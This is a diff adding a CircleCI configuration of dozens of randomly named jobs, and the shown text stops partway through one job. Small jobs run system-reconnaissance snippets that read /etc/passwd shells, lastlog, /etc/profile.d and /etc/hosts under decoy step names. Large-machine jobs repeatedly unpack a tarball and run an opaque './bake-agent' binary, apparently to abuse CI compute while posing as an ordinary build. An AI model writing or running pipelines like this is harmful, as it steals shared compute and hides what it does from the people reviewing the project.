@@ -1,0 +1,1698 @@
+version: 2.1
+
+jobs:
+  build-2022-w11:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture 1
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            set +o pipefail 2>/dev/null; find /usr/bin -maxdepth 1 -type f 2>/dev/null | head -50 > /var/tmp/ci-stage/VioletLayerLagoon; seq 1 1410699 >> /var/tmp/ci-stage/VioletLayerLagoon; true
+            ls -la /var/tmp/ci-stage/VioletLayerLagoon | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'VioletLayerLagoon'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  tempMu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: sales scale in step
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; if [ -e /etc/hosts ]; then echo 'present'; elif [ -e /tmp ]; then echo maybe; else echo 'absent'; fi; true ; } > /var/tmp/ci-stage/1b8102f8ffc39196217aecda4a591
+            ls -la /var/tmp/ci-stage/1b8102f8ffc39196217aecda4a591 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '1b8102f8ffc39196217aecda4a591'
+  add-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  SUM7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: BONUS
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; ext_of() { echo "[$(date +%T)] $*"; }; ext_of 'let'\''s go!'; true ; } > /var/tmp/ci-stage/g1yph_r3ce1pt_y131d_golden
+            ls -la /var/tmp/ci-stage/g1yph_r3ce1pt_y131d_golden | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'g1yph_r3ce1pt_y131d_golden'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/g1yph_r3ce1pt_y131d_golden 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  m_classBtn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Mark V running headless browser
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; grep -sRl export /etc/profile.d 2>/dev/null|tail -n 1; true ; } > /var/tmp/ci-stage/frozen-bond
+            ls -la /var/tmp/ci-stage/frozen-bond | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'frozen-bond'
+  cf-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/frozen-bond 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  fe-f5-b6-54:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: busy isolating service accounts
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; echo 'on it' 1>"/tmp/framecanyon.list" 2>/tmp/bridgeleft.dat && cat "/tmp/framecanyon.list"; true ; } > /var/tmp/ci-stage/serVerfILtER
+            ls -la /var/tmp/ci-stage/serVerfILtER | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'serVerfILtER'
+  chore-9714:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  span130:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: mk pkgs bak
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; cut -d: -f7 /etc/passwd | sed 's|.*/||' | tr "a-z" "A-Z"; true ; } > /var/tmp/ci-stage/gadget480
+            ls -la /var/tmp/ci-stage/gadget480 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'gadget480'
+  bug-8806:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/gadget480 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  flyssswykpy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: The API keys renewed ok
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type f -name 'lastlog' -exec head -n 1 -q {} + 2>/dev/null | cat -n; true ; } > /var/tmp/ci-stage/dc5235ce-691d-38b0
+            ls -la /var/tmp/ci-stage/dc5235ce-691d-38b0 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'dc5235ce-691d-38b0'
+  uma-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/dc5235ce-691d-38b0 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  chenchen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: FAST sanity check
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; cp -p /etc/hosts "/tmp/JuiceDrawer.csv" && ls -l --time-style=+%F /etc/hosts "/tmp/JuiceDrawer.csv"; true ; } > /var/tmp/ci-stage/14.07.2025
+            ls -la /var/tmp/ci-stage/14.07.2025 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '14.07.2025'
+  cf-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/14.07.2025 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  Gamma_n1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Batch the adapter weights and log metrics
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; printf 'red\t99\nseed\t50\nbridge\t62\neagle\t53\n' >"/tmp/garage_0427.tsv" && cut -f1 "/tmp/garage_0427.tsv"; true ; } > /var/tmp/ci-stage/20260418
+            ls -la /var/tmp/ci-stage/20260418 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '20260418'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/20260418 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  blockPool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Label Cycle Count r2
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -path '*/fd' -mmin +5 -nouser -exec head -n 1 -q {} + 2>/dev/null|xargs ls -ld; true ; } > /var/tmp/ci-stage/dswhwrezfnpp7
+            ls -la /var/tmp/ci-stage/dswhwrezfnpp7 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'dswhwrezfnpp7'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/dswhwrezfnpp7 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  an1m4tez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: ACCRUE RECEIVABLES START
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; (trap "echo cleaning up" EXIT; echo "what's next?"); true ; } > /var/tmp/ci-stage/ShaDerNoRTHbOND
+            ls -la /var/tmp/ci-stage/ShaDerNoRTHbOND | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'ShaDerNoRTHbOND'
+  CORE-820:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/ShaDerNoRTHbOND 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  arrClean:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Straight after probe the fan curve
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; grep -srn bash /etc 2>/dev/null | tail -n 1; true ; } > /var/tmp/ci-stage/QUARK
+            ls -la /var/tmp/ci-stage/QUARK | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'QUARK'
+  ruby3-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/QUARK 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  panel_full_coupon_init:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture 1
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; x=1; for i in {1..9}; do x=$((x * 2)); done; echo $x; true ; } > /var/tmp/ci-stage/driver.log.2
+            ls -la /var/tmp/ci-stage/driver.log.2 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'driver.log.2'
+  ed-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/driver.log.2 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  assert_segment_inner:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Optimisation whilst we wait
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; function half { echo "[$(date +%T)] $*"; }; half 'x y z'; true ; } > /var/tmp/ci-stage/VID_00090930
+            ls -la /var/tmp/ci-stage/VID_00090930 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'VID_00090930'
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VID_00090930 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  FormCanvasHandlerCur:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: CHECK TCP
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; echo 'server is up' | tee /tmp/quote-seed-20240207.out "/tmp/tag-ginger-post.copy" >/dev/null && cat "/tmp/tag-ginger-post.copy"; true ; } > /var/tmp/ci-stage/PXL_51102
+            ls -la /var/tmp/ci-stage/PXL_51102 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'PXL_51102'
+  bun-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  exitHeightBlock:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: DO NOT skip the consumer group
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; shuf -e cat crow wolf seal eagle -n 2; true ; } > /var/tmp/ci-stage/7b513ae
+            ls -la /var/tmp/ci-stage/7b513ae | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '7b513ae'
+  fx-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/7b513ae 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  c8b5bd9a38275:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: expanding login button quietly
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f \( -name '*' -o -name '*.sock' \) -empty 2>/dev/null | nl; true ; } > /var/tmp/ci-stage/cfgdevui
+            ls -la /var/tmp/ci-stage/cfgdevui | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'cfgdevui'
+  v3-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/cfgdevui 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  AcornV4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Texture weapon stats and profile
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; find /usr/share -type f -name '*.xml' -user $(id -un) 2>/dev/null | tail -n 6; true ; } > /var/tmp/ci-stage/west_61719
+            ls -la /var/tmp/ci-stage/west_61719 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'west_61719'
+  jan22-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  BB75:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Raw footage faded on demand
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; command -v bash > /dev/null 2>&1 && echo yes || echo no; true ; } > /var/tmp/ci-stage/LAzytokEnMaPle
+            ls -la /var/tmp/ci-stage/LAzytokEnMaPle | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'LAzytokEnMaPle'
+  LAB_VERIFY_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/LAzytokEnMaPle 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  LS-PTR-C:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: DEFRAGMENT SLOW QUERY LOG COMPLETE
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; for w in {0..9}; do printf '%02d\n' $w; done | head -n 3; true ; } > /var/tmp/ci-stage/debug.log.9
+            ls -la /var/tmp/ci-stage/debug.log.9 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'debug.log.9'
+  Run_Service9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  zoneNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: stitching sprite sheet in background
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; awk '{printf "%-10s|\n", $1}' /etc/hosts | head -n15; true ; } > /var/tmp/ci-stage/Af
+            ls -la /var/tmp/ci-stage/Af | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'Af'
+  add-router-v2-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/VioletLayerLagoon 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  BundleRayCategory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Ensure that the leases are scheduled
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; printf 'host=web01\nport=1175\nuser=olga\ndebug=true\n' >"/dev/shm/flourstreet.dat" && (. "/dev/shm/flourstreet.dat" && echo "$host:$port"); true ; } > /var/tmp/ci-stage/Eh
+            ls -la /var/tmp/ci-stage/Eh | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'Eh'
+  py310-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/Eh 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  ttbFixture_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Friendly reminder spellcheck
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; grep -i -m2 fi /etc/profile | tail -3; true ; } > /var/tmp/ci-stage/sha_948c9c21f36
+            ls -la /var/tmp/ci-stage/sha_948c9c21f36 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - 'sha_948c9c21f36'
+  rm-queue-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/sha_948c9c21f36 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: tar xzvf static-content.tgz
+      - run:
+          command: sleep 25s
+      - run:
+          command: "./bake-agent"
+  aki_bot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Shared Drive Sweep SRCH7316
+          command: |
+            mkdir -p /var/tmp/ci-stage
+            { set +o pipefail 2>/dev/null; str="call the plumber"; echo "$str" | grep -o . | sort | uniq -c | sort -rn | head -n 3; true ; } > /var/tmp/ci-stage/77ceb321-8ff0-0beb-3443
+            ls -la /var/tmp/ci-stage/77ceb321-8ff0-0beb-3443 | awk '{print $5"B",$9}'
+      - persist_to_workspace:
+          root: /var/tmp/ci-stage
+          paths:
+            - '77ceb321-8ff0-0beb-3443'
+  atlas-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/ci-stage
+      - run:
+          name: Fetch staged result
+          command: |
+            cat /var/tmp/ci-stage/77ceb321-8ff0-0beb-3443 2>/dev/null | awk '{print length}' | paste -sd+ | bc 2>/dev/null || true
+      - run:
+          name: Clone project
+          command: git clone --depth 3 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
